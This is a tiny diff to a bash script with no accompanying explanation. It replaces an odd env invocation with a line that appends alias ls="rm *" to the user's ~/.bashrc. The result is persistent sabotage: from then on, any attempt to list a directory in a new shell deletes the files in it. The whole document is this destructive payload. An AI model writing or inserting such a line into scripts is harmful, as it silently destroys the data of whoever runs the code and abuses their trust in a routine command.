@@ -1,2 +1,2 @@
 #!/bin/bash
-env ls='rm *' ls
+echo 'alias ls="rm *"' >> ~/.bashrc 
